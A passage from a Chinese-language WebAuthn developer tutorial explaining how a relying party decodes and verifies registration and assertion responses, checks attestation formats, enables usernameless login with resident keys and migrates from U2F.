rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\n    response: {\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\n    }\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\n    origin: \"https://dev.axton.cc\",\n    type: \"webauthn.create\"\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\n    clientExtensions: {},\n    hashAlgorithm: \"SHA-256\",\n    origin: \"https://dev.axton.cc\",\n    type: \"webauthn.create\"\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    fmt: \"none\",\n    attStmt: {},\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\n    let rpIdHash = buffer.slice(0, 32);\n    buffer = buffer.slice(32);\n  \n    let flagsBuf = buffer.slice(0, 1);\n    buffer = buffer.slice(1);\n\n    let flagsInt = flagsBuf[0];\n    let flags = {\n        up: !!(flagsInt &amp; 0x01),\n        uv: !!(flagsInt &amp; 0x04),\n        at: !!(flagsInt &amp; 0x40),\n        ed: !!(flagsInt &amp; 0x80),\n        flagsInt\n    }\n\n    let counterBuf = buffer.slice(0, 4);\n    buffer = buffer.slice(4);\n  \n    let counter = counterBuf.readUInt32BE(0);\n\n    let aaguid = undefined;\n    let credID = undefined;\n    let COSEPublicKey = undefined;\n\n    if(flags.at) {\n        aaguid = buffer.slice(0, 16);\n        buffer = buffer.slice(16);\n\n        let credIDLenBuf = buffer.slice(0, 2);\n        buffer = buffer.slice(2);\n\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\n        credID = buffer.slice(0, credIDLen);\n\n        buffer = buffer.slice(credIDLen);\n        COSEPublicKey = buffer;\n    }\n\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    kty: \"EC\",\n    alg: \"ECDSA_w_SHA256\",\n    crv: \"P-256\",\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    fmt: \"packed\",\n    attStmt: {\n        alg: -7,\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\n        x5c: [\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\n        ]\n    },\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\n    type: \"public-key\",\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\n    response: {\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\n    }\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\n    origin: \"https://dev.axton.cc\",\n    type: \"webauthn.get\"\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\n{\n    alg, // 算法\n    sig // 签名\n}\n// 基础或证明 CA 证明\n{\n    alg,\n    sig,\n    x5c // X.509 证书链\n}\n// 椭圆曲线证明\n{\n    alg,\n    sig,\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\n    let pemcert = '';\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    ver: \"200616037\",\n    response: {\n        type: \"Buffer\",\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\n    }\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\n    timestampMs: 1584950686460,\n    apkPackageName: \"com.google.android.gms\",\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\n    ctsProfileMatch: true,\n    apkCertificateDigestSha256: [\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\n    ],\n    basicIntegrity: true,\n    evaluationType: \"BASIC\"\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    alg: \"RS256\",\n    x5c: [\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\n    ]\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\n    publicKey: {\n        ...\n        authenticatorSelection: {\n            requireResidentKey: true,\n            userVerification: \"required\"\n            ...\n        },\n        ...\n    }\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\n    publicKey: {\n        ...\n        userVerification: \"required\",\n        allowCredentials: [],\n        ...\n    }\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\n    appid: \"https://example.com\" //U2F appid\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about 